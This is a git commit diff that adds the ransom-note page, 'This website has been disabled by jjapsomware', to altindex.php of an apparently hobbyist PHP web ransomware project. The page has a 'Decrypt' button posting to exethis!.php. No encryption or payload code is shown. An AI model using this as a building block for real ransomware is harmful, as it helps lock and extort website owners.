36b1191bc065c1fa8cb58f6fd7e31ffd86ecf756
Antibiotics <abx@abx.pe.kr>
2021-04-18 02:54:02 +0900

    0.0.1

--- altindex.php
+++ altindex.php
@@ -2,10 +2,35 @@
 <html>
 <head>
 	<meta charset = "UTF-8">
-	<title>  </title>
+	<title> jjapsomware 0.0.1 </title>
+	<style>
+		body {
+			text-align: center;
+			margin: 0 0 0 0;
+			padding: 0 0 0 0;
+			background-color: black;
+		}
+		
+		#container {
+			padding-top: 5%;
+		}
+		
+		#container h2 {
+			font-size: 135%;
+			color: white;
+		}
+		
+		#container p {
+			font-size: 115%;
+			color: white;
+		}
+	</style>
 </head>
 <body>
 	<div id = "container">
+		<h2> This website has been disabled by jjapsomware </h2>
+		<p> Press the 'decrypt' below to recover. </p>
+		<br>
 		<form action = "./exethis!.php" method = "POST">
 			<button type = "submit" name = "decrypt" value = "RUN"><b>Decrypt</b></button>
 		</form>
